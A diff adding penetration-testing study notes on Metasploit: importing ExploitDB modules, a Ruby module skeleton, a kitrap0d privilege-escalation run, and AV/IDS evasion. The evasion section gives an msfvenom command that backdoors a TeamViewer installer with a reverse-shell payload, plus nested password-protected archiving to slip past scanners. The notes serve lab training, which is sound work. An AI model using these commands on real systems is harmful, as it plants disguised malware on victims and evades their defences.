@@ -864,3 +864,223 @@ These commands allow you to retrieve sensitive data, impersonate users, or pivot
 ---
 
 Meterpreter's versatility and power make it an essential tool in any penetration tester's arsenal.
+
+#Extra
+
+
+# Writing and Importing Modules
+
+To install any new Metasploit modules which have already been ported over by other users, one can choose to update their msfconsole from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of msfconsole. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.
+
+However, if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually. We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of msfconsole locally.
+
+## ExploitDB Search
+
+ExploitDB is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is Metasploit Framework (MSF), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the msfconsole.
+
+[ExploitDB - Metasploit Modules](https://www.exploit-db.com/?tag=3)
+
+Example: Searching for a Nagios3 exploit with command injection.
+
+```bash
+msf6 > search nagios
+```
+
+If the module is not found, search ExploitDB or use the CLI tool `searchsploit`.
+
+```bash
+searchsploit nagios3
+```
+
+Filter results:
+
+```bash
+searchsploit -t Nagios3 --exclude=".py"
+```
+
+## Installing a Module Manually
+
+Download the `.rb` file and place it in the correct directory. Ensure the folder structure matches the Metasploit Framework directory:
+
+```bash
+cp ~/Downloads/module.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/
+```
+
+Reload modules in `msfconsole`:
+
+```bash
+msf6 > reload_all
+```
+
+Then use the module:
+
+```bash
+msf6 > use exploit/unix/webapp/nagios3_command_injection
+```
+
+## Porting Scripts into Metasploit Modules
+
+### Adapting Existing Scripts
+
+To adapt a Python or PHP exploit to Metasploit, knowledge of Ruby is necessary. Start with boilerplate code from existing modules and modify as needed.
+
+```ruby
+##
+# This module requires Metasploit: https://metasploit.com/download
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+  include Msf::Auxiliary::Report
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Custom Module",
+      'Description'    => %q{Description of the exploit},
+      'License'        => MSF_LICENSE,
+      'Author'         => ['Author Name'],
+      'References'     => [['CVE', 'xxxx-xxxx']],
+      'Platform'       => 'php',
+      'Targets'        => [['Target Name', {}]],
+      'DefaultTarget'  => 0))
+  end
+end
+```
+
+### Resources for Learning
+
+- [Metasploit Documentation](https://docs.metasploit.com)
+- Metasploit: A Penetration Tester's Guide by No Starch Press
+- Rapid7 Blog Posts
+
+
+# Introduction to MSFVenom
+
+MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.
+
+MSFVenom is the result of the marriage between these two tools. Before this tool, we had to pipe (|) the result from MSFPayload, which was used to generate shellcode for a specific processor architecture and OS release, into MSFEncode, which contained multiple encoding schemes used both for removing bad characters from shellcode (this could sometimes cause instability during the runtime), and for evading older Anti-Virus (AV) and endpoint Intrusion Prevention / Intrusion Detection (IPS/IDS) software.
+
+...
+
+### MSF - Local Privilege Escalation
+
+```bash
+msf6 exploit(multi/handler) > search kitrap0d
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank   Check  Description
+   -  ----                                     ---------------  ----   -----  -----------
+   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D
+...
+
+[*] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000
+
+meterpreter > getuid
+
+Server username: NT AUTHORITY\SYSTEM
+```
+
+
+# Firewall and IDS/IPS Evasion
+
+## Understanding Defenses
+
+To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:
+
+- **Endpoint protection**
+- **Perimeter protection**
+
+### Endpoint Protection
+Endpoint protection refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (DMZ).
+
+Examples include software packs like Antivirus Protection, Antimalware Protection (bloatware, spyware, adware, ransomware), Firewall, and Anti-DDOS. Familiar names are Avast, Nod32, Malwarebytes, and BitDefender.
+
+### Perimeter Protection
+Perimeter protection usually comes in physical or virtualized devices on the network perimeter edge. These edge devices themselves provide access inside of the network from the outside, in other terms, from public to private.
+
+Between these two zones, there is often a third one, called the **De-Militarized Zone (DMZ)**. This is a virtual space where public-facing servers are housed. These servers interact with public clients while being managed and updated from the private internal network.
+
+---
+
+## Security Policies
+Security policies are the backbone of any well-maintained security posture of a network. They function similarly to Access Control Lists (ACLs) and dictate how traffic or files are handled within a network boundary.
+
+### Types of Policies:
+- **Network Traffic Policies**
+- **Application Policies**
+- **User Access Control Policies**
+- **File Management Policies**
+- **DDoS Protection Policies**
+
+### Detection Methods
+The following are ways to match events with security policy rules:
+
+1. **Signature-based Detection**: Matches packets against pre-built attack patterns.
+2. **Heuristic/Statistical Anomaly Detection**: Monitors behavioral deviations from a baseline.
+3. **Stateful Protocol Analysis Detection**: Compares traffic to known definitions of non-malicious activity.
+4. **Live-monitoring and Alerting (SOC-based)**: A Security Operations Center monitors live feeds for threats.
+
+---
+
+## Evasion Techniques
+Modern Antivirus (AV) and IDS/IPS products rely heavily on signature-based detection, which identifies malicious patterns in software or traffic. To bypass these:
+
+### Key Techniques:
+1. **Encrypted Payloads**:
+   MSF6 can tunnel AES-encrypted communication between the attacker and victim.
+2. **Executable Templates**:
+   Use templates like legitimate software to embed payloads, reducing detection.
+3. **Archiving with Passwords**:
+   Compressing and password-protecting files can bypass some antivirus scanners.
+4. **Packers**:
+   Tools like UPX or Themida compress executables, obfuscating the payload.
+
+---
+
+## Generating Backdoored Executables with `msfvenom`
+
+To embed a payload into a legitimate executable, use:
+
+```bash
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+```
+
+The `-k` flag ensures the legitimate executable continues to run after launching the payload.
+
+---
+
+## Archiving Payloads
+
+1. Archive the payload with a password:
+   ```bash
+   rar a ~/test.rar -p ~/test.js
+   ```
+2. Remove the file extension:
+   ```bash
+   mv test.rar test
+   ```
+
+3. Archive the resulting file again with another password:
+   ```bash
+   rar a test2.rar -p test
+   ```
+
+This multi-layer archiving can bypass many antivirus scanners.
+
+---
+
+## Packers
+
+Packers compress and obfuscate executables, making detection harder. Examples include UPX, Themida, and Enigma Protector.
+
+---
+
+## A Note on Evasion
+
+Evasion is a vast topic and cannot be fully covered here. Practice evasion skills with older HTB machines or virtual environments with outdated antivirus software.
